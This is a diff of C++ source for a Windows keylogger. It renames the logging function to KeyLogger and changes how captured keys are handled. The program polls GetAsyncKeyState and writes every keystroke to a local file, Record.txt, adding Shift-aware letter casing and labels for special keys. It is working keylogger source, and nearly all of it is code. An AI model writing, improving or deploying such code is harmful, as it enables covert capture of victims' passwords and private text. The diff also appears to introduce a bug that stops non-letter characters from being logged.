@@ -2,8 +2,9 @@
 #include <windows.h>
 #include <winuser.h>
 #include <fstream>
+#include <unistd.h>
 
-void Log(void)
+void KeyLogger(void)
 {
     char character;
 
@@ -32,37 +33,45 @@ void Log(void)
                 // -32767 indicates a key press event.
                 std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
 
-                switch (character)
+                if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                 {
-                case 8: // 8 means backspace.
-                {
-                    write << " <Backspace> ";
+                    // 0x10 is the hexadecimal notation for the "Shift" key
+                    character += 32;
+                    write << character;
                 }
-                break;
-                case 13: // 13 is for tthe "Enter Key"
-                {
-                    write << " <Enter> " << std::endl;
-                }
-                break;
-                case 27: // 27 is for the "Escape key"
-                {
-                    write << " <ESC> ";
-                }
-                break;
-                case 32: // 32 is for the "Space key"
-                {
-                    write << " <Space> ";
-                }
-                break;
-                case 127: // 127 is for the "Delete key"
-                {
-                    write << " <Delete> ";
-                }
-                break;
-                default:
+
+                else if (character > 64 && character < 91)
                 {
                     write << character;
                 }
+
+                switch (character)
+                {
+                    case 8: // 8 means backspace.
+                    {
+                        write << " <Backspace> ";
+                    }
+                    break;
+                    case 13: // 13 is for tthe "Enter Key"
+                    {
+                        write << " <Enter> " << std::endl;
+                    }
+                    break;
+                    case 27: // 27 is for the "Escape key"
+                    {
+                        write << " <ESC> ";
+                    }
+                    break;
+                    case 32: // 32 is for the "Space key"
+                    {
+                        write << " <Space> ";
+                    }
+                    break;
+                    case 127: // 127 is for the "Delete key"
+                    {
+                        write << " <Delete> ";
+                    }
+                    break;
                 }
             }
         }
@@ -71,5 +80,5 @@ void Log(void)
 
 int main(void)
 {
-    Log();
+    KeyLogger();
 }
